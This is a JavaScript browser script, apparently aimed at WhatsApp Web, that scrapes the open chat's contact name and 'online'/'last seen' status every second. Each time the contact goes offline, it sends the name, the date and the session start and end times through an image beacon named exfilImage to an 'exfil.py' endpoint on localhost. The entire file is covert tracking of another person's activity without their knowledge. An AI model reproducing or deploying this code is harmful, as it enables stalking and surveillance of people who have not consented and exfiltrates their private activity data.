var UserClass = "";
var lastOnline = "";

for(let i = 0; i <= document.getElementsByTagName("span").length; i++) {
    try {
        if(document.getElementsByTagName("span")[i].hasAttribute("data-testid")) {
            if (document.getElementsByTagName("span")[i].getAttribute("data-testid") == "conversation-info-header-chat-title") {
                UserClass = document.getElementsByTagName("span")[i].getAttribute("class");
            }
        }

        if(document.getElementsByTagName("span")[i].hasAttribute("title")) {
            if (document.getElementsByTagName("span")[i].innerText.includes("last seen") || document.getElementsByTagName("span")[i].innerText.includes("zuletzt online")){
                lastOnline = document.getElementsByTagName("span")[i].getAttribute("class");
            }
        }
    } catch {}
}

var online = document.getElementsByClassName(lastOnline);
var user = document.getElementsByClassName(UserClass);
var startTime = "DUMMY";
var endTime = "DUMMY";

function trackuser() {
	var track = 1;
	if (track) {
		setTimeout(function(){
			var today = new Date();
			var date = today.getFullYear()+'/'+(today.getMonth()+1)+'/'+today.getDate();
			var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
			var encodedDate = encodeURIComponent(date);
			var encodedTime = encodeURIComponent(time);
			try {
				if (online.length > 0 && (online[0].innerText == "online" || online[0].innerText == "typing..." || online[0].innerText == "en línea" || online[0].innerText == "escribiendo...")) {
					if (startTime == "DUMMY") {
						startTime = encodedTime;
					}
					endTime = encodedTime;
					console.log("User online! (" + user[0].title + ")");
				} else {
					if (startTime != "DUMMY") {
						var encodedUser = encodeURIComponent(user[0].innerText);
						var exfilImage = new Image();
						exfilImage.src = "http://127.0.0.1/cgi-bin/exfil.py?user=" + encodedUser + "&date=" + encodedDate  +  "&starttime=" + startTime + "&endtime=" + endTime;

						startTime = "DUMMY";
						endTime = "DUMMY";
					} else {
						if(online.length > 0) {
							console.log("User "+ user[0].title + " not online. Last online: " + online[0].innerText + " (Not sending)");
						} else {
							console.log("User "+ user[0].title + " not online - Privacy mode activated");
						}
					}
				}
			} catch(error) {
				console.log("User "+ user[0].title +" not online - Privacy mode activated (" + error + ")");
			}
			trackuser();
		}, 1000);
	}
}
trackuser()

